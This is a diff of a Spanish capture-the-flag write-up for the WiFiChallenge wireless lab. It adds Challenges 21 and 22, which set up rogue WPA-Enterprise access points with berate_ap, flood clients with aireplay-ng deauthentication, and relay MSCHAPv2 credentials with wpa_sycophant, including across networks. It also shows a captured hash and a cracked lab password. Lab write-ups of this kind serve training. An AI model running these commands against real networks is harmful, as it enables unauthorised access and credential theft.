@@ -54,17 +54,17 @@ python3 /root/tools/eaphammer/eaphammer --cert-wizard
 
 Esto nos ira pidiendo información que deberemos ir cogiendo de la información del certificado sacado con `pcapFilter`&#x20;
 
-<figure><img src="../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>
 
 ```
 mv "WiFiChallenge CA-1.pem" /home/user/wifi/MGT/
 ```
 
-<figure><img src="../../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>
 
 > Esto sirve por si un usuario mira el certificado del AP, veo los campos en texto, no es obligatorio para el lab pero si recomendable en la vida real
 
@@ -74,7 +74,7 @@ Ahora que tenemos el certificado, levantamos el punto de acceso con `eaphammer`
 python3 /root/tools/eaphammer/eaphammer -i wlan3 --auth wpa-eap --essid wifi-corp
 ```
 
-<figure><img src="../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>
 
 Una vez que este el falso AP levantado, volvemos a monitorizar con `airodump-ng` el canal correspondiente (el 44) -->
 
@@ -82,7 +82,7 @@ Una vez que este el falso AP levantado, volvemos a monitorizar con `airodump-ng`
 airodump-ng wlan0 -c44
 ```
 
-<figure><img src="../../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (8) (1).png" alt=""><figcaption></figcaption></figure>
 
 Vemos que wifi-corp tiene dos APs y hay otro mas, que es el nuestro (el que termina en `44:00`, el rojo)
 
@@ -101,7 +101,7 @@ aireplay-ng -0 0 -a F0:9F:C2:71:22:15 -c 64:32:A8:07:6C:40 wlan0
 
 <mark style="background-color:yellow;">Se lo tiramos al mismo cliente en ambas redes, para que asi, cuando se desconecte de una e intente ir a la otra que conoce, tambien se desconecte y por ultimo, vaya hacia la nuestra</mark>
 
-<figure><img src="../../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (7) (1).png" alt=""><figcaption></figcaption></figure>
 
 Vemos que el cliente se conecta y desconecta (ya que no tenemos su contraseña y no podemos continuar con la autentificación) pero tenemos un hash en `mschapv2`
 
@@ -114,7 +114,7 @@ nano juan.hash
 juan.tr::::e85353c383224cb95be75727ad5f86bf9486335aa76b9070:8c1fe46f72a842f1
 ```
 
-<figure><img src="../../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (9) (1).png" alt=""><figcaption></figcaption></figure>
 
 Rompemos con `hashcat` -->
 
@@ -124,7 +124,7 @@ Rompemos con `hashcat` -->
 
 > `mschapv2` es un cifrado duro y sera muy lento el crakeo
 
-<figure><img src="../../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (10) (1).png" alt=""><figcaption></figcaption></figure>
 
 > Ahora en el caso de que cerremos la terminal y perdamos el hash, podemos volver a verlo en `/root/tools/eaphammer/logs/` (archivo `hostapd-eaphammer.log`)
 
@@ -150,17 +150,17 @@ nano juan-corp.conf
 </strong><strong>dhclient -v wlan1
 </strong></code></pre>
 
-<figure><img src="../../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (11) (1).png" alt=""><figcaption></figcaption></figure>
 
 Y ahora apuntamos dede el navegador a la puerta de enlace `6.1`
 
-<figure><img src="../../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (12) (1).png" alt=""><figcaption></figcaption></figure>
 
 Tenemos credenciales -->
 
 `CONTOSO\juan.jr:bulldogs1234`
 
-<figure><img src="../../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (13) (1).png" alt=""><figcaption></figcaption></figure>
 
 ***
 
@@ -185,7 +185,7 @@ echo 'CONTOSO\test' > test.user
 >
 > `-u` : user name / domain
 
-<figure><img src="../../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (14) (1).png" alt=""><figcaption></figcaption></figure>
 
 Tenemos la contraseña del usuario test del dominio, asi que nos conectamos con `wpa_supplicant`
 
@@ -210,7 +210,7 @@ wpa_supplicant -i wlan1 -c test-corp.conf
 dhclient -v wlan1
 ```
 
-<figure><img src="../../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (15) (1).png" alt=""><figcaption></figcaption></figure>
 
 <figure><img src="../../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>
 
@@ -270,3 +270,186 @@ dhclient -v wlan1
 <figure><img src="../../../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>
 
 <figure><img src="../../../.gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>
+
+***
+
+## Challenge 21
+
+* ¿Cuál es la flag en el AP wifi-regional-tablets?
+
+Vamos a tener que crear un punto de acceso AP falso, asi que lo primero que vamos a hacer es cambiarnos nuestra MAC -->
+
+```
+macchanger -m F0:9F:C2:00:00:00 wlan1
+```
+
+<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+
+> Utilizaremos el wlan1
+
+Ahora debemos usar `wpa_sycophant`, muy parecido a `wpa_supplicant`, para este hay que modificar el archvio `wpa_sycophant_example.conf`
+
+```
+nano /root/tools/wpa_sycophant/wpa_sycophant_example.conf
+```
+
+Debemos modificar dos lineas, la de `ssid` y la de `blacklist_bssid` == Una es poner el nombre de la wifi a falsear y el otro es poner nuestra MAC para no conectarnos nosotros mismos
+
+<figure><img src="../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+
+```
+network={
+  ssid="wifi-regional-tablets"
+  # The SSID you would like to relay and authenticate against. 
+  scan_ssid=1
+  key_mgmt=WPA-EAP
+  # Do not modify
+  identity=""
+  anonymous_identity=""
+  password=""
+  # This initialises the variables for me.
+  # -------------
+  eap=PEAP
+  # Read https://w1.fi/cgit/hostap/plain/wpa_supplicant/wpa_supplicant.conf for help with phase1 options. 
+  # This attempts to force the client not use cryptobinding. 
+  phase1="peapver=1"
+  phase2="auth=MSCHAPV2"
+  # Dont want to connect back to ourselves,
+  # so add your rogue BSSID here.
+  bssid_blacklist=f0:9f:c2:00:00:00
+}
+```
+
+Ahora para hacer el ataque necesitamos abrir varias ventanas
+
+1. En una de ellas, levantamos el AP falso con `berate_ap` (ya que este esta peparado para comunicarse directamente con `sycophant`)
+
+```
+/root/tools/berate_ap/berate_ap --eap --mana-wpe --wpa-sycophant --mana-credout outputMana.log wlan1 lo wifi-regional-tablets
+```
+
+> Nos pide una configuracion manual o que la dejemos por defecto (lo mejor siempre es manual ya que tenemos la info del certf del AP origin sacada en el reto 18)
+
+<figure><img src="../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+
+2. Una vez que esta montado ejecutamos `wpa_sycophant` en la otra ventana
+
+```
+./wpa_sycophant.sh -c wpa_sycophant_example.conf -i wlan3
+```
+
+3. En la tercera pestaña, para hacer el ataque de des autentificación al cliente conectado a la red, lo vemos con airodump-ng -->
+
+```
+airodump-ng wlan0 -c 44 --bssid F0:9F:C2:7A:33:28
+```
+
+<figure><img src="../../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+
+Vemos dos clientes, asi que ahora hacemos el ataque de des, contra uno de ellos
+
+```
+aireplay-ng -0 0 wlan0 -a F0:9F:C2:7A:33:28 -c 64:32:A8:A9:DE:55
+```
+
+<figure><img src="../../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+
+Ahora en wpa\_sycophant vemos como se conecta y tambien dando su hash -->
+
+<figure><img src="../../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+
+Y tambien como nos conectamos auto a la red -->
+
+<figure><img src="../../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
+
+Ahora pedimo ip con `dhclient`
+
+```
+dhclient wlan3 -v
+```
+
+<figure><img src="../../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
+
+Ahora podemos apuntar desde el navegador a la puerta de enlace y coger la flag
+
+<figure><img src="../../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>
+
+***
+
+## Challenge 22
+
+* ¿Cuál es la flag en el AP wifi-regional?
+
+Para esto, vamos a hacer casi lo mismo que el reto anterior
+
+Asi que tenemos que modificar el fichero `wpa_sycophant_example.conf`, modificando la primera linea que es la el nombre del AP -->
+
+<figure><img src="../../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
+
+Y ejecutamos directamente el `wpa_sycophant`
+
+```
+./wpa_sycophant.sh -c wpa_sycophant_example.conf -i wlan3
+```
+
+En otra terminal, nos levantamos el `berate_ap` (exactamente igual que antes) soloq eu con wifi-regional ahora -->
+
+```
+/root/tools/berate_ap/berate_ap --eap --mana-wpe --wpa-sycophant --mana-credout outputMana.log wlan1 lo wifi-regional
+```
+
+Ahora escaneamos su red con aerodump-ng para sacar la info del BSSID y de los clientes -->
+
+```
+airodump-ng wlan0 -c 44 --bssid F0:9F:C2:71:22:16
+```
+
+<figure><img src="../../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
+
+Y ahora (cuando el AP falso esta levantado) lanzamos con `aireplay-ng` el ataque des autentificación
+
+```
+aireplay-ng wlan0 -0 0 -a F0:9F:C2:71:22:16 -c 64:32:A8:AC:53:50
+```
+
+> Si hay algun problema en la ejecucion, reiniciar todo y levantar de nuevo el modo monitor
+
+Al ejecutarlo vemos como el berate\_ap nos da un erro de CA
+
+<figure><img src="../../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>
+
+Esto significa que este ataque no funcionara contra este AP porque el cliente verifica la CA, asi que nunca se nos va a conectar
+
+<mark style="background-color:yellow;">Tenemos que buscar otra forma para atacar este tipo de red</mark>
+
+<mark style="background-color:yellow;">Muchas veces, als empresas con diferentes redes suelen estar conectadas el mismo directorio activo por detrás, y por grupo y/o users, se configura quien puede acceder a ciertas redes</mark>
+
+Podemo levantar un AP falso con wifi-regional-tables (como en el challenge anterior) manteniendo el wpa\_sycopham a la red wifi-regional. Asi que un cliente se nos conecta al AP falso de wifi-regional-tables y reenviamos sus credenciales a wifi-regional
+
+Levanatamos el AP de wifi-regional-tables
+
+```
+/root/tools/berate_ap/berate_ap --eap --mana-wpe --wpa-sycophant --mana-credout outputMana.log wlan1 lo wifi-regional-tablets
+```
+
+Manemos el wpa\_sycophant a la wifi-regional original -->
+
+```
+./wpa_sycophant.sh -c wpa_sycophant_example.conf -i wlan3
+```
+
+Y por ultimo el ataque des autentificaon se hace contra un cliente de wiif-regiona-tables (como en el challenges anterior)(reuitlizo ese comando) -->
+
+```
+aireplay-ng -0 0 wlan0 -a F0:9F:C2:7A:33:28 -c 64:32:A8:A9:DE:55
+```
+
+Con esto conseguimos que un cliente de wifi-regional-tablets se conecte a nuestro  AP falso y su credenciales son reenviadas a wifi\_regional, conectándonos asi automáticamente
+
+<figure><img src="../../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>
+
+Pedimos ip con `dhclient` y apuntamos conel navegador directamente a la puerta de enlace -->
+
+<figure><img src="../../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>
